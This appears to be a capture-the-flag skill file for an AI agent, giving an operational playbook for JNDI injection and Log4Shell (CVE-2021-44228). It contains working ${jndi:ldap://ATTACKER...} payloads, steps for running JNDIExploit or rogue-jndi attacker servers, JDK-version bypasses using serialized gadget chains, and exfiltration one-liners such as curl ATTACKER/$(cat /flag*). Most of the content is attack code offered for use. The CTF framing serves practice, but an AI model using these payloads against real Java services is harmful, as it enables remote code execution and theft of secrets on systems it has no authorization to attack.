---
name: jndi-injection
description: JNDI injection and Log4Shell (CVE-2021-44228). Use when a Java app does JNDI lookups with attacker-controlled names (Log4j2 log fields, Spring, any InitialContext.lookup path). Covers the ${jndi:...} payload, RMI/LDAP vectors, JDK version constraints, and the post-8u191 serialized-gadget bypass. The goal is usually RCE on the Java app to read the flag.
---

# JNDI Injection / Log4Shell

## 1. Trigger

Any input logged by Log4j2 or passed to `InitialContext.lookup()`:

```
${jndi:ldap://ATTACKER:1389/a}
${jndi:rmi://ATTACKER:1099/a}
${jndi:dns://ATTACKER/a}       # detection only — confirms injection via DNS hit
```

Injection points: User-Agent, X-Forwarded-For, username/login fields, search terms, headers — anything that lands in a log line or a lookup.

## 2. Vectors

- **LDAP** (preferred): attacker runs an LDAP server returning `javaCodeBase`/`javaFactory` → JVM downloads and runs the class.
- **RMI**: attacker returns a `Reference` to `http://ATTACKER/Exploit.class`.
- **DNS**: confirm-only (no RCE) — fire `${jndi:dns://x.ATTACKER}` and watch for the lookup.

```bash
# attacker side (JNDIExploit / rogue-jndi style):
java -jar JNDIExploit-1.4.jar -i ATTACKER_IP   # serves ldap:// + rmi:// + http:// payloads
# then send: ${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<b64 of cat /flag*>}
```

## 3. JDK constraints & bypass

| JDK | RMI | LDAP | Bypass |
|---|---|---|---|
| < 8u121 | yes | yes | direct class load |
| 8u121–8u190 | no | yes | use LDAP |
| ≥ 8u191 | no | no | **LDAP returns a serialized gadget object** (`javaSerializedData`) — deserialized locally, needs a gadget chain (CommonsCollections/CommonsBeanutils) on the classpath |

Modern targets are usually ≥ 8u191, so prefer the **LDAP serialized-gadget** route or the **BeanFactory + EL** route over naive class loading.

## 4. Tooling

`JNDIExploit` / `rogue-jndi` / `marshalsec` — single jars that spin up LDAP+RMI+HTTP and encode commands. Run them on a host reachable from the target (VPN/tunnel); then the payload is just a log line.

## 5. Read the flag

After RCE: `cat /flag*`, `find / -name 'flag*' -exec cat {} \; 2>/dev/null`, `env | grep -i flag`. If output is not returned (blind), use `${jndi:ldap://ATTACKER/${env:FLAG}}` or command-exfil: `curl ATTACKER/$(cat /flag*)`.

## 6. Discipline

- Confirm with `${jndi:dns://...}` (cheap, no RCE) before the full LDAP payload.
- Check the JDK version (`java -version` or version in error banners) to pick RMI vs LDAP vs serialized-gadget.
- Log4Shell only fires on Log4j2 ≤ 2.14.1 — check `log4j` in the app's jars/headers first; a modern Log4j (2.17+) won't trigger.
